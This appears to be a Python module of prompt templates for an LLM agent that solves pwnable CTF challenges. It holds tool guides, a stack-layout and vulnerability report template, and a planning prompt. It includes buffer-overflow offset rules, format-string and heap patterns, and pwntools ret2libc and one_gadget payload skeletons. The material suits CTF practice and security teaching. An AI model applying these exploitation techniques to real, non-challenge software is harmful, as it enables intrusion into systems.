import jinja2
from typing import Any, Dict, List, Optional
from LangGraph.state import (
    SolverState,
    get_state_for_plan,
    get_state_for_instruction,
    get_state_for_parsing,
    get_state_for_feedback,
    get_state_for_exploit,
)

# Jinja2 environment setup
# ChainableUndefined: 속성 접근 시 에러 대신 빈 값 반환
env = jinja2.Environment(
    undefined=jinja2.ChainableUndefined,
    trim_blocks=True,
    lstrip_blocks=True,
)

env.filters["tojson"] = lambda x: __import__("json").dumps(x, indent=2, ensure_ascii=False)


# =============================================================================
# Tool Guidance (Detailed)
# Based on Tool class methods in Tool/tool.py
# =============================================================================

CHECKSEC_GUIDANCE = """## Checksec - Binary Protection Analysis

Use Checksec as your **first step** when analyzing any binary. It reveals critical information about exploitation constraints.

### Usage
```json
{
  "tool": "Checksec",
  "args": {}
}
```

**Note**: Tool instance is pre-initialized with binary_path. No arguments needed.

### Example Output
```
[*] '/path/to/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Exploitation Implications

| Protection | If Enabled | If Disabled |
|------------|------------|-------------|
| **NX** | Cannot execute shellcode on stack/heap → Need ROP/ret2libc | Can jump to shellcode directly |
| **Canary** | Need canary leak before overflow → Look for format string or other leak | Direct buffer overflow works |
| **PIE** | Addresses randomized → Need binary base leak | Fixed addresses (0x400000 base) |
| **Full RELRO** | GOT is read-only → Cannot overwrite GOT entries | GOT overwrite possible |
| **Partial RELRO** | GOT writable → GOT overwrite possible | GOT overwrite possible |

### When to Use
- **ALWAYS** run this first before any other analysis
- Results determine your entire exploitation strategy

### Analysis Output Format
After running Checksec, update analysis document:
```json
{
  "analysis_updates": {
    "checksec": {
      "done": true,
      "result": "NX enabled, No canary, No PIE, Partial RELRO"
    }
  }
}
```
"""

RUN_GUIDANCE = """## Run - Generic Bash Command Execution

Execute **any bash command**. Supports standard Linux tools (strings, file, xxd, objdump, readelf, etc.) as well as python/perl scripts.

### Tool Call
```json
{
  "tool": "Run",
  "args": {"cmd": "strings -a ./vuln | grep -i flag"}
}
```

### Usage Examples
```json
// Basic analysis commands
{"tool": "Run", "args": {"cmd": "file ./vuln"}}
{"tool": "Run", "args": {"cmd": "strings -n 8 ./vuln"}}
{"tool": "Run", "args": {"cmd": "readelf -a ./vuln"}}
{"tool": "Run", "args": {"cmd": "objdump -d -M intel ./vuln"}}
{"tool": "Run", "args": {"cmd": "xxd ./vuln | head -100"}}

// Pipe / compound commands
{"tool": "Run", "args": {"cmd": "strings ./vuln | grep -E 'flag|password|secret'"}}
{"tool": "Run", "args": {"cmd": "objdump -d ./vuln | grep -A5 '<main>'"}}

// Script execution
{"tool": "Run", "args": {"cmd": "python3 solve.py"}}
{"tool": "Run", "args": {"cmd": "python3 -c 'print(0x400000 + 0x1234)'"}}

// Custom timeout (default: 60s)
{"tool": "Run", "args": {"cmd": "./slow_binary", "timeout": 120}}
```

### Common Linux Tools
| Command | Purpose |
|---------|---------|
| `file` | Identify file type (ELF 32/64, stripped, etc.) |
| `strings -n 8` | Extract strings with min length 8 |
| `readelf -a` | Full ELF headers, sections, symbols |
| `readelf -s` | Symbol table only |
| `objdump -d -M intel` | Disassembly (Intel syntax) |
| `xxd` / `hexdump -C` | Hex dump |
| `nm` | Symbol listing |
| `ldd` | Dynamic library dependencies |

### Tips
- Output is automatically saved under `Challenge/<binary>/`
- Large outputs are truncated for LLM, but full results are saved to file
- Use `cwd` argument to specify working directory (default: binary location)
"""

GHIDRA_MAIN_GUIDANCE = """## Ghidra_main - Main Function Decompilation

Decompile the main function (or entry point) to understand program flow. This is typically your **second step** after Checksec.

### Usage
```json
{
  "tool": "Ghidra_main",
  "args": {"main_only": true}
}
```

**Parameters:**
- `main_only` (bool, default=True): If True, only decompile main. If False, decompile all entry functions.

### Example Output
```c
=== MATCH: main 0x401156 ===
--- Decompiled Code ---
int main(void) {
    setup();
    vuln();
    return 0;
}
```

### What to Look For
1. **Function calls** - Identify functions to analyze further (e.g., `vuln()`, `read_input()`)
2. **Input handling** - How does the program read user input? (`scanf`, `gets`, `read`, `fgets`)
3. **Control flow** - Loops, conditions that affect exploitation
4. **Global variables** - May be useful for exploitation (GOT, BSS variables)

### When to Use
- After Checksec, to understand overall program structure
- When you need to find the entry point to vulnerable code path

### Analysis Output Format
```json
{
  "analysis_updates": {
    "decompile": {
      "done": true,
      "functions": [
        {"name": "main", "address": "0x401156", "code": "int main() {...}"}
      ]
    }
  }
}
```
"""

GHIDRA_DECOMPILE_GUIDANCE = """## Ghidra_decompile_function - Specific Function Decompilation

Decompile specific functions to find vulnerabilities. Use this after identifying interesting functions from main.

### Usage
```json
// By function name (preferred)
{
  "tool": "Ghidra_decompile_function",
  "args": {"function_name": "vuln"}
}

// By address (for stripped binaries)
{
  "tool": "Ghidra_decompile_function",
  "args": {"function_address": "0x401234"}
}
```

### Example Output
```c
void vuln(void) {
    char buf[64];
    gets(buf);  // VULNERABLE: no bounds checking
    return;
}
```

---

## CRITICAL: Vulnerability Patterns & Offset Calculation

### Buffer Overflow Patterns

| Pattern | Severity | Offset Calculation |
|---------|----------|-------------------|
| `char buf[N]; gets(buf)` | CRITICAL | offset = N + 8 |
| `char buf[N]; scanf("%s", buf)` | CRITICAL | offset = N + 8 |
| `char buf[N]; read(0, buf, M)` where M > N | HIGH | offset = N + 8 |
| `char buf[N]; strcpy(buf, src)` | HIGH | offset = N + 8 |
| `char buf[N]; fgets(buf, M, stdin)` where M > N | MEDIUM | offset = N + 8 |

### Offset Calculation Examples

**Example 1: Simple buffer**
```c
void vuln(void) {
    char buf[64];  // 64 bytes at RBP-0x40
    gets(buf);
}
// Offset to RIP = 64 + 8 = 72 bytes
```

**Example 2: Multiple local variables**
```c
void vuln(void) {
    char buf[32];   // RBP-0x30
    int x;          // RBP-0x34
    long y;         // RBP-0x40
    gets(buf);
}
// Stack: [buf:32][x:4][y:8][padding?][saved_rbp:8][ret_addr:8]
// Check actual layout with: sub rsp, 0xXX instruction
// Offset = distance from buf to saved_rbp + 8
```

**Example 3: Ghidra variable notation**
```c
void vuln(void) {
    char local_48[64];  // Ghidra names it local_48 = at RBP-0x48
    gets(local_48);
}
// local_48 means offset 0x48 from RBP
// Offset to RIP = 0x48 + 8 = 0x50 = 80 bytes
```

### Format String Patterns

| Pattern | What to do |
|---------|------------|
| `printf(user_input)` | Find stack offset with %p, use %n for write |
| `sprintf(buf, user_input)` | Format string + potential overflow |
| `fprintf(f, user_input)` | Same as printf |
| `snprintf(buf, n, user_input)` | Format string (limited overflow) |

### Heap Patterns

| Pattern | Vulnerability |
|---------|---------------|
| `free(ptr); func(ptr)` | Use-After-Free |
| `free(ptr); free(ptr)` | Double Free |
| `malloc(user_size)` without check | Heap manipulation |
| `realloc(ptr, new_size)` | Potential UAF if fails |

---

## Reading Ghidra Decompiled Code

### Variable Naming Convention
- `local_XX` = Local variable at RBP-0xXX
- `param_N` = Nth function parameter
- `DAT_XXXXXX` = Global data at address
- `FUN_XXXXXX` = Function at address

### Stack Layout Reconstruction
```c
void vuln(void) {
    undefined8 local_48;  // RBP-0x48, 8 bytes
    undefined4 local_40;  // RBP-0x40, 4 bytes
    char local_3c[44];    // RBP-0x3c, 44 bytes
    // ...
}

// To find offset from local_3c to RIP:
// local_3c is at RBP-0x3c = RBP-60
// Need to fill: 60 bytes (to RBP) + 8 bytes (saved RBP) = 68 bytes to RIP
```

### Common Win Functions to Look For
- `win`, `flag`, `shell`, `system`, `backdoor`
- Functions that call `system("/bin/sh")` or read flag file
- If found: **ALWAYS set `win_function: true` in analysis_updates**
  - No PIE: jump directly to fixed address → no leak needed
  - PIE enabled: need binary base leak first, then jump to `pie_base + win_offset`

---

### Analysis Output Format
```json
{
  "analysis_updates": {
    "decompile": {
      "done": true,
      "functions": [
        {"name": "vuln", "address": "0x401136", "code": "void vuln() {...}"}
      ]
    },
    "vulnerabilities": [
      {
        "type": "buffer_overflow",
        "severity": "critical",
        "function": "vuln",
        "location": "0x401150",
        "buffer_var": "local_48",
        "buffer_size": 64,
        "estimated_offset": 72,
        "description": "64-byte buffer with gets() - no bounds checking",
        "code_snippet": "char local_48[64]; gets(local_48);",
        "exploit_constraints": ["no input size limit"],
        "exploit_mechanism": "standard linear overflow: payload = padding + canary + rbp + ret_addr"
      }
    ],
    "offsets": {
      "buffer_to_rbp": 64,
      "buffer_to_rip": 72,
      "verified": false
    },
    "win_function": true
  }
}
```
*(Set `win_function: true` only when a win/flag/backdoor function is confirmed)*
"""

PWNINIT_GUIDANCE = """## Pwninit - Libc Patching Setup

Automatically patch the binary to use the provided libc. Essential when a challenge provides `libc.so.6`.

### Usage
```json
{
  "tool": "Pwninit",
  "args": {}
}
```

**Note**: Runs in the directory containing the binary. No arguments needed.

### What It Does
1. Detects `libc.so.6` (or `libc-*.so`) in the binary's directory
2. Detects `ld-linux-x86-64.so.2` loader if present
3. Patches the binary to use the provided libc
4. Creates `<binary>_patched` for local testing

### Expected Directory Structure
```
./challenge/
├── vuln              # Original binary (set as binary_path)
├── libc.so.6         # Provided libc
├── ld-linux-x86-64.so.2  # (optional) Provided loader
└── vuln_patched      # Created by pwninit
```

### When to Use
- **BEFORE** running One_gadget (must analyze correct libc)
- **BEFORE** calculating libc offsets for exploitation
- When challenge provides custom libc

### When NOT to Use
- If no libc is provided (system libc will be used)
- If already patched (check for `*_patched` file)

**IMPORTANT**: Always run Pwninit before One_gadget or offset calculations!

### Analysis Output Format
```json
{
  "analysis_updates": {
    "libc": {
      "detected": true,
      "path": "./libc.so.6",
      "version": "2.31"
    }
  }
}
```
"""

ROPGADGET_GUIDANCE = """## ROPgadget - ROP Gadget Search

Find ROP gadgets in the binary for return-oriented programming attacks.

### Usage
```json
// Get all gadgets (large output - avoid unless necessary)
{
  "tool": "ROPgadget",
  "args": {}
}

// Filter for specific gadget (RECOMMENDED)
{
  "tool": "ROPgadget",
  "args": {"query": "pop rdi"}
}
```

**Parameters:**
- `query` (str, optional): Filter string to search gadgets (case-insensitive)

### Common Queries
```json
{"tool": "ROPgadget", "args": {"query": "pop rdi"}}      // 1st argument control
{"tool": "ROPgadget", "args": {"query": "pop rsi"}}      // 2nd argument control
{"tool": "ROPgadget", "args": {"query": "pop rdx"}}      // 3rd argument control
{"tool": "ROPgadget", "args": {"query": "ret"}}          // Stack alignment
{"tool": "ROPgadget", "args": {"query": "leave"}}        // Stack pivot
{"tool": "ROPgadget", "args": {"query": "syscall"}}      // Direct syscall
```

### Example Output
```
0x0000000000401234 : pop rdi ; ret
0x0000000000401236 : pop rsi ; pop r15 ; ret
0x0000000000401238 : ret
```

### x64 Calling Convention (for ROP)

| Register | Argument | Common Gadget |
|----------|----------|---------------|
| RDI | 1st arg | `pop rdi ; ret` |
| RSI | 2nd arg | `pop rsi ; ret` or `pop rsi ; pop r15 ; ret` |
| RDX | 3rd arg | `pop rdx ; ret` (rare in binary, check libc) |
| RCX | 4th arg | `pop rcx ; ret` |

### ret2libc ROP Chain Pattern
```python
from pwn import *

# Typical ret2libc chain
payload = flat(
    b'A' * offset,           # Overflow to return address
    pop_rdi,                 # pop rdi ; ret
    bin_sh_addr,             # Address of "/bin/sh"
    ret,                     # Stack alignment (16-byte for Ubuntu 18.04+)
    system_addr              # system() address
)
```

### When to Use
- After identifying buffer overflow vulnerability
- When NX is enabled (cannot execute shellcode)
- For ret2libc or full ROP chain construction

### Analysis Output Format
```json
{
  "analysis_updates": {
    "gadgets": [
      {"instruction": "pop rdi ; ret", "address": "0x401234"},
      {"instruction": "ret", "address": "0x401238"}
    ]
  }
}
```
"""

PWNDBG_GUIDANCE = """## Pwndbg - Dynamic Debugging with GDB

Debug the binary with GDB to understand runtime behavior. **CRITICAL** for exploit development.

### Usage
```json
{
  "tool": "Pwndbg",
  "args": {
    "commands": ["break main", "run", "info registers"],
    "timeout": 30
  }
}
```

**Parameters:**
- `commands` (list[str]): GDB commands to execute in sequence
- `timeout` (int, default=30): Timeout in seconds

**Note**: Runs in batch mode (`gdb -batch`). Use `run` to start the program.

### Essential GDB Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `break *addr` | Set breakpoint at address | `break *0x401234` |
| `break func` | Set breakpoint at function | `break main` |
| `run` | Start program execution | `run` |
| `continue` | Continue after breakpoint | `continue` |
| `x/Ngx addr` | Examine N qwords at addr | `x/20gx $rsp` |
| `x/s addr` | Examine as string | `x/s 0x402000` |
| `info registers` | Show all registers | `info registers` |
| `p/x $rsp` | Print register value | `p/x $rip` |
| `vmmap` | Show memory mappings | `vmmap` (pwndbg) |
| `heap` | Show heap state | `heap` (pwndbg) |
| `bins` | Show free bins | `bins` (pwndbg) |

### Finding Buffer Overflow Offset
```json
// Step 1: Run with pattern input (use pwntools cyclic externally)
{
  "tool": "Pwndbg",
  "args": {
    "commands": [
      "run < /tmp/pattern.txt",
      "info registers rsp rbp"
    ]
  }
}

// Step 2: Check crash, note the value in RBP or return address
// Use pwntools: cyclic_find(0x6161616c) to get offset
```

### Examining Stack After Input
```json
{
  "tool": "Pwndbg",
  "args": {
    "commands": [
      "break *0x401189",     // After read/gets
      "run < /tmp/input.txt",
      "x/20gx $rsp",         // Examine stack
      "x/s $rsp"             // Examine as string
    ]
  }
}
```

### Checking Function Addresses (No PIE)
```json
{
  "tool": "Pwndbg",
  "args": {
    "commands": [
      "info functions",       // List all functions
      "p system",            // Print system address (if linked)
      "x/i 0x401030"         // Disassemble PLT entry
    ]
  }
}
```

### When to Use
- To find exact buffer overflow offset
- To verify exploit payload reaches correct locations
- To check register/stack state at crash
- To debug why exploit isn't working
- To find runtime addresses (PIE, ASLR)

**CRITICAL**: When an exploit fails, use Pwndbg to understand WHY. Do not blindly modify payloads.
"""

ONE_GADGET_GUIDANCE = """## One_gadget - Libc Execve Gadgets

Find "magic" gadgets in libc that spawn a shell with minimal setup.

### Usage
```json
{
  "tool": "One_gadget",
  "args": {}
}
```

**IMPORTANT**: This tool runs `one_gadget` on the binary_path. For libc analysis, ensure:
1. The Tool instance is initialized with libc path, OR
2. Run Pwninit first to patch the binary with correct libc

### Example Output
```
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

### Understanding Constraints
Each one_gadget has **constraints** that MUST be satisfied at call time:

| Constraint | Meaning | How to Satisfy |
|------------|---------|----------------|
| `rcx == NULL` | RCX register must be 0 | Often satisfied after certain libc calls |
| `[rsp+0x40] == NULL` | Stack at RSP+0x40 must be 0 | Pad payload or choose different gadget |
| `rsp & 0xf == 0` | Stack must be 16-byte aligned | Add extra `ret` gadget before |

### Usage in Exploit
```python
from pwn import *

# After leaking libc address
libc_base = leaked_addr - libc.sym['puts']
one_gadget = libc_base + 0x4f2a5  # Choose one that fits

# For GOT overwrite
write_addr(got_entry, one_gadget)

# For ROP chain (simpler than full ret2libc)
payload = flat(
    b'A' * offset,
    ret,          # Alignment if needed
    one_gadget
)
```

### When to Use
- When you have limited control (only return address overwrite)
- As a quick alternative to full ret2libc chain
- When at least one gadget's constraints can be satisfied

### When NOT to Use
- If no gadget's constraints can be met (use full ret2libc instead)
- For challenges that explicitly block one_gadget

### Analysis Output Format
```json
{
  "analysis_updates": {
    "libc": {
      "detected": true,
      "path": "./libc.so.6",
      "one_gadgets": "0x4f2a5, 0x4f302, 0x10a2fc"
    }
  }
}
```
"""


DOCKER_GUIDANCE = """## Docker - Exploit Testing Environment

When `pwninit` patched binary doesn't work locally, use Docker to test in actual challenge environment.

### Docker_setup - Auto-configure Docker environment

```json
{
  "tool": "Docker_setup",
  "args": {
    "port": 1337,
    "ubuntu_version": "22.04"
  }
}
```

**What it does:**
1. If Dockerfile exists → use it
2. If no Dockerfile → auto-generate one with:
   - Ubuntu base image
   - Copies binary + provided libc files
   - Sets up socat to serve the binary on specified port

**Parameters:**
- `port` (int, default=1337): Port to expose
- `ubuntu_version` (str, default="22.04"): Ubuntu version if auto-generating
- `timeout` (int, default=300): Build timeout in seconds

### Docker_exploit_test - Run exploit against Docker

```json
{
  "tool": "Docker_exploit_test",
  "args": {
    "port": 1337
  }
}
```

Runs `exploit.py` against the Docker container. Auto-detects flags in output.

**Parameters:**
- `exploit_path` (str, optional): Path to exploit.py (default: Challenge/<binary>/exploit.py)
- `port` (int, default=1337): Target port
- `timeout` (int, default=60): Execution timeout

### Docker_stop - Stop and cleanup

```json
{
  "tool": "Docker_stop",
  "args": {}
}
```

Stops and removes the container.

### Docker_status - Check running containers

```json
{
  "tool": "Docker_status",
  "args": {}
}
```

Lists all pwn-related Docker containers.

### When to Use Docker

1. **Local pwninit exploit fails** - Environment mismatch
2. **Different libc version** - Challenge provides specific libc
3. **ASLR/environment differences** - Docker matches challenge environment
4. **Final verification** - Before submitting to remote

### Workflow Example

```
1. Exploit works locally with pwninit? → Done
2. Doesn't work?
   → Docker_setup (creates environment)
   → Docker_exploit_test (test exploit)
   → Analyze output, adjust exploit
   → Repeat until success
3. Docker_stop (cleanup)
```
"""


# =============================================================================
# Tool Description Renderer
# =============================================================================

TOOL_GUIDANCES = {
    "Checksec": CHECKSEC_GUIDANCE,
    "Run": RUN_GUIDANCE,
    "Ghidra_main": GHIDRA_MAIN_GUIDANCE,
    "Ghidra_decompile_function": GHIDRA_DECOMPILE_GUIDANCE,
    "Pwninit": PWNINIT_GUIDANCE,
    "ROPgadget": ROPGADGET_GUIDANCE,
    "Pwndbg": PWNDBG_GUIDANCE,
    "One_gadget": ONE_GADGET_GUIDANCE,
    "Docker_setup": DOCKER_GUIDANCE,
    "Docker_exploit_test": DOCKER_GUIDANCE,
    "Docker_stop": DOCKER_GUIDANCE,
    "Docker_status": DOCKER_GUIDANCE,
}


def render_tool_descriptions(tool_names: Optional[List[str]] = None) -> str:
    """Render detailed tool guidance as markdown"""
    tools = tool_names or list(TOOL_GUIDANCES.keys())
    sections = ["# Available Tools\n"]

    for name in tools:
        if name in TOOL_GUIDANCES:
            sections.append(TOOL_GUIDANCES[name])

    return "\n\n---\n\n".join(sections)


# =============================================================================
# Analysis Document Template (Core State Format)
# =============================================================================

ANALYSIS_DOCUMENT_TEMPLATE = env.from_string("""## Binary Information

### Checksec
{% if analysis.checksec.done %}
```
{{ analysis.checksec.result }}
```
{% else %}
[NOT YET]
{% endif %}

### Decompiled Code
{% if analysis.decompile.done %}
{% for func in analysis.decompile.functions %}
#### {{ func.name | default("unknown") }} ({{ func.address | default("0x0") }})
```c
{{ func.code | default("// No code available") }}
```
{% endfor %}
{% else %}
[NOT YET]
{% endif %}

### Disassembly
{% if analysis.disasm.done %}
```asm
{{ analysis.disasm.result }}
```
{% else %}
[NOT YET]
{% endif %}

---

## Vulnerability Analysis

### Identified Vulnerabilities
{% if analysis.vulnerabilities %}
{% for vuln in analysis.vulnerabilities %}
#### {{ vuln.type | default("unknown") }} in `{{ vuln.function | default("unknown") }}`
- **Location:** {{ vuln.location | default("N/A") }}
- **Description:** {{ vuln.description | default("N/A") }}
{% if vuln.exploit_mechanism is defined and vuln.exploit_mechanism %}
- **⚠️ Exploit Mechanism:** {{ vuln.exploit_mechanism }}
{% endif %}
{% if vuln.exploit_constraints is defined and vuln.exploit_constraints %}
- **⚠️ Constraints:**
{% for c in vuln.exploit_constraints %}
  - `{{ c }}`
{% endfor %}
{% endif %}
{% if vuln.code_snippet is defined and vuln.code_snippet %}
```c
{{ vuln.code_snippet }}
```
{% endif %}
{% endfor %}
{% else %}
[NOT YET]
{% endif %}

### Exploitation Strategy
{% if analysis.strategy %}
{{ analysis.strategy }}
{% else %}
[NOT YET]
{% endif %}

---

## Libc / Libraries

### Libc Detected
{% if analysis.libc.detected %}
- **Path:** {{ analysis.libc.path }}
- **Version:** {{ analysis.libc.version | default("Unknown") }}
{% else %}
[NOT YET]
{% endif %}

### One Gadgets
{% if analysis.libc.one_gadgets %}
```
{{ analysis.libc.one_gadgets }}
```
{% else %}
[NOT YET]
{% endif %}

### Useful Offsets
{% if analysis.libc.offsets %}
| Symbol | Offset |
|--------|--------|
{% for sym, off in analysis.libc.offsets.items() %}
| {{ sym }} | {{ off }} |
{% endfor %}
{% else %}
[NOT YET]
{% endif %}

---

## ROP / Gadgets

### Key Gadgets
{% if analysis.gadgets %}
| Gadget | Address |
|--------|---------|
{% for g in analysis.gadgets %}
| {{ g.instruction | default("unknown") }} | {{ g.address | default("0x0") }} |
{% endfor %}
{% else %}
[NOT YET]
{% endif %}

---

## Heap Pointer Structure
{% if analysis.heap_pointer_type is defined and analysis.heap_pointer_type and analysis.heap_pointer_type != "unknown" %}
- **Pointer Type:** {{ analysis.heap_pointer_type }}
{% if analysis.heap_pointer_type == "single" %}
- **CRITICAL:** Single pointer → unsorted bin leak FAILS (no guard chunk to prevent consolidation). Must use **stdout BSS partial overwrite** or similar technique.
{% elif analysis.heap_pointer_type == "array" %}
- Array pointer → unsorted bin leak works (can keep guard chunk alive).
{% endif %}
{% else %}
[NOT ANALYZED or N/A]
{% endif %}

---

## I/O Patterns
{% if analysis.io_patterns is defined and analysis.io_patterns %}
{% for io in analysis.io_patterns %}
- Prompt: `{{ io.prompt | default("") }}` | Method: `{{ io.input_method | default("unknown") }}` | Format: `{{ io.format | default("") }}`
{% endfor %}
{% else %}
[NOT YET]
{% endif %}

---

## Dynamic Verification (Pwndbg/GDB)

{% set dv = analysis.dynamic_verification if analysis.dynamic_verification is defined else {} %}
{% if dv.verified %}
✅ **Verified** — runtime values extracted by LLM from GDB output.

### Stack Offsets (from buf[0])
| Field | Value |
|-------|-------|
| buf[0] → canary | `{{ dv.buf_offset_to_canary }}` bytes |
| buf[0] → saved RBP | `{{ dv.buf_offset_to_saved_rbp }}` bytes |
| buf[0] → return addr | `{{ dv.buf_offset_to_ret }}` bytes |
| canary offset from RBP | `{{ dv.canary_offset_from_rbp }}` |

{% if dv.binary_base %}
### Memory Layout
- Binary base: `{{ dv.binary_base }}`
- RBP at capture: `{{ dv.rbp_value | default("?") }}`
{% endif %}

{% if dv.local_vars %}
### Local Variables
| Name | Address | Size | Offset from RBP |
|------|---------|------|----------------|
{% for v in dv.local_vars %}
| `{{ v.name }}` | `{{ v.address }}` | {{ v.size }} | {{ v.offset_from_rbp }} |
{% endfor %}
{% endif %}

{% if dv.raw_gdb_output %}
### Raw GDB Output (excerpt)
```
{{ dv.raw_gdb_output[:800] }}
```
{% endif %}
{% else %}
⚠️ **NOT YET DONE** — dynamic verification is REQUIRED before exploit generation.

**ACTION REQUIRED:** Run `Pwndbg` with stack inspection commands, then have the Parsing Agent
extract and populate the `dynamic_verification` fields in this document.

Suggested commands:
```
break read
run < /dev/zero
up
info frame
info locals
x/8gx $rbp-0x30
x/2gx $rbp
p/x $rbp
```
{% endif %}

---

## Binary Function Symbols

{% if function_symbols %}
| Function | Address |
|----------|---------|
{% for fname, addr in function_symbols.items() %}
| `{{ fname }}` | `{{ addr }}` |
{% endfor %}
{% if analysis.win_function is defined and analysis.win_function %}
⚠️ **Win/backdoor function detected** (`{{ analysis.win_function_name | default("see above") }}` @ `{{ analysis.win_function_addr | default("?") }}`).
Use this function as the exploit target — **no libc leak needed**.
{% endif %}
{% else %}
[NOT YET — will be populated by Phase 1 RECON]
{% endif %}

---

## Exploit Readiness

| Component | Status |
|-----------|--------|
| Binary analyzed | {{ "DONE" if analysis.checksec.done else "PENDING" }} |
| Vulnerability found | {{ "DONE" if analysis.vulnerabilities else "PENDING" }} |
| Leak primitive | {{ "DONE" if analysis.leak_primitive else "PENDING" }} |
| Control flow hijack | {{ "DONE" if analysis.control_hijack else "PENDING" }} |
| Payload ready | {{ "DONE" if analysis.payload_ready else "PENDING" }} |

**Overall Score:** {{ analysis.readiness_score | default(0.0) }} / 1.0
""")


# =============================================================================
# SYSTEM PROMPTS
# =============================================================================

PLAN_SYSTEM = env.from_string("""You are the **Plan Agent** for a pwnable CTF solver system.

{% if challenge %}
## Challenge Context
- **Title:** {{ challenge.title | default("Unknown") }}
- **Category:** {{ challenge.category | default("pwnable") }}
- **Flag Format:** {{ challenge.flag_format | default("FLAG{...}") }}
{% if challenge.description %}
- **Description:** {{ challenge.description }}
{% endif %}
{% if binary_path %}
- **Binary:** `{{ binary_path }}`
{% endif %}
{% endif %}

## Your Role
1. Analyze the current Analysis Document
2. Follow the PHASED ANALYSIS WORKFLOW below
3. Create 2-4 prioritized tasks for the current phase
4. Update the Analysis Document with any new findings

## Output Format (STRICT JSON)
```json
{
  "reasoning": "Brief explanation of your analysis and decisions",
  "current_phase": "recon",
  "tasks": [
    {
      "id": "task_001",
      "title": "Check binary protections",
      "objective": "Run checksec to identify protections",
      "tool_hint": "Checksec",
      "priority": 0.9
    }
  ],
  "analysis_updates": {},
  "next_focus": "What to prioritize next",
  "blockers": [
    {"question": "Is the leak offset correct?", "severity": 0.9, "resolved": false}
  ],
  "hypotheses": [
    {"statement": "The buffer size is 64 bytes based on local_40 variable", "confidence": 0.8}
  ]
}
```
*(blockers = unresolved questions blocking progress; hypotheses = assumptions to verify)*

{% if analysis_failure_reason %}
---

## ⚠️ RE-ANALYSIS CONTEXT (Exploit previously failed)

**Failure reason:** {{ analysis_failure_reason }}

{% if exploit_failure_context %}
**Failed stage:** `{{ exploit_failure_context.stage_id }}`
**Error:** {{ exploit_failure_context.error[:400] }}
**Failing code:**
```python
{{ exploit_failure_context.code[:600] }}
```
{% endif %}

**Your task:** Identify WHY the exploit failed and create tasks to fix the root cause.
Common causes:
- Wrong leak offset (leaked 0x0 → check bytes received, recvuntil pattern)
- Wrong buffer offset to RIP (check with Pwndbg cyclic)
- Wrong I/O interaction (check sendlineafter prompts match exactly)
- Wrong libc base calculation (verify leaked symbol offset)
{% endif %}

---

## CRITICAL: Phased Analysis Workflow

### Phase 1: RECON (First iteration)
**Goal: Understand the binary and protections**

| Priority | Task | Tool | Why |
|----------|------|------|-----|
| 0.98 | List files | `Run: ls -la` | Find provided files (libc, ld, etc.) **FIRST** |
| 0.95 | Check protections | `Checksec` | Determines entire exploit strategy |
| 0.90 | Decompile main | `Ghidra_main` | Understand program flow |
| **0.90** | **Patch libc if provided** | `Pwninit` | **MANDATORY if libc.so.6 exists** — run BEFORE any exploit |

**CRITICAL: Pwninit is MANDATORY when libc.so.6 is present.**
- If `ls` shows `libc.so.6` or `libc-*.so` → immediately create Pwninit task (priority 0.90)
- Pwninit patches the binary so local testing matches remote environment
- Without this, leaked addresses and offsets will be WRONG

**Checklist before moving to Phase 2:**
- [ ] Checksec completed
- [ ] Main function decompiled
- [ ] Pwninit run if libc.so.6 present

### Phase 2: VULNERABILITY HUNT
**Goal: Find exploitable vulnerabilities + understand binary I/O**

| Priority | Task | Tool | When to use |
|----------|------|------|-------------|
| **0.95** | **Identify exact I/O strings** | `Run: echo "1" \\| timeout 2 ./binary` or decompile | **ALWAYS** — needed for exploit I/O |
| **0.95** | **Identify heap pointer structure** | Decompile main/alloc functions | **If heap vuln detected** — single ptr vs array? |
| 0.90 | Decompile suspicious functions | `Ghidra_decompile_function` | After seeing function calls in main |
| 0.85 | Search for dangerous functions | `Run: objdump -d | grep -E "gets|strcpy|sprintf"` | Quick pattern scan |
| 0.80 | Analyze input handling | Decompile functions with read/scanf/gets | Look for overflow |
| 0.75 | Check for format strings | Look for printf(user_input) | Format string attack |

**CRITICAL: Record exact menu/prompt strings from decompiled code!**
- Note every `printf`/`puts` output string exactly as-is
- Note input methods (`scanf`, `read`, `gets`) and their formats
- These are needed by Exploit Agent to generate correct `sendlineafter`/`recvuntil` calls
- Store in analysis.io_patterns: `[{"prompt": "Size: ", "input_method": "scanf", "format": "%d"}, ...]`

**CRITICAL: Record binary-specific overflow constraints in `exploit_constraints` and `exploit_mechanism`!**
- If there is a size/length check (e.g., `if (len > 1000) break`), record it: `"len <= 1000"`
- If the overflow works via a non-standard mechanism (e.g., repeat loop, loop counter overshoot), explain it:
  - Example: `"exploit_mechanism": "pattern repeat overshoot — use pattern len L s.t. floor(limit/L)*L + L > target_offset; use target_len=limit to stay under the check"`
- If the input is limited (e.g., `read(0, inp, 80)`), record: `"pattern length <= 80"`
- **The exploit agent WILL try to send oversized payloads if it doesn't know these constraints!**

**CRITICAL: Heap pointer structure (if heap vulnerability detected):**
- Count how many chunk pointer variables exist: `void *chunk` (single) vs `void *chunks[N]` (array)
- Store in analysis: `"heap_pointer_type": "single"` or `"heap_pointer_type": "array"`
- This DETERMINES which libc leak technique works:
  - **Single pointer** → unsorted bin leak FAILS → must use stdout BSS partial overwrite
  - **Array pointer** → unsorted bin leak works (can keep guard chunk)

**What to look for:**
```c
// Buffer Overflow
char buf[64];
gets(buf);           // CRITICAL: No bounds check
read(0, buf, 0x100); // If 0x100 > sizeof(buf)

// Format String
printf(user_input);  // CRITICAL: User controls format

// Use-After-Free
free(ptr);
ptr->field = value;  // CRITICAL: Dangling pointer
```

**Checklist before moving to Phase 3:**
- [ ] At least one vulnerability identified
- [ ] Vulnerability type known
- [ ] Vulnerable function decompiled

### Phase 3: EXPLOITATION PREP
**Goal: Gather all primitives needed for exploitation**

#### For Buffer Overflow:
| Priority | Task | Tool |
|----------|------|------|
| **0.95** | **Verify offset with GDB (REQUIRED)** | `Pwndbg: send cyclic pattern, check crash RIP` |
| 0.90 | Calculate offset (static estimate) | From decompiled code: `buf[N]` → offset ≈ N+8 |
| 0.85 | Find ROP gadgets | `ROPgadget: pop rdi` |
| 0.85 | Find leak target | GOT entry for puts/printf |
| 0.80 | Get libc offsets | `One_gadget` or symbol parsing |

